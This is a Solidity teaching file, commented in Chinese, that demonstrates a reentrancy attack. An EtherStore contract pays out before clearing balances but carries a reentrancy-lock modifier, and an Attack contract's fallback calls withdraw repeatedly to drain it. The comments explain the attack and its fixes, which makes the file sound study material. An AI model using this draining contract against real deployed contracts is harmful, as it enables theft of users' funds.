// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/*
重入攻击的核心：被攻击的合约是 先转账后修改余额
预防核心：改成先修改余额再转账 or 加上重入锁函数修饰符，禁止取钱函数被多次调用

整体攻击合约调用过程：
- Attack.attack
- EtherStore.deposit  (攻击合约必须先存钱，合约地址才有对应的余额)
- EtherStore.withdraw (攻击合约有余额，就可以进行取钱的操作了)
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint) public balances;

    bool internal locked;

    //重入锁函数修饰符  
    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public noReentrant {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            //防止合约进入死循环，当取不出来钱的时候，被攻击合约余额为0，那么就会退出函数
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
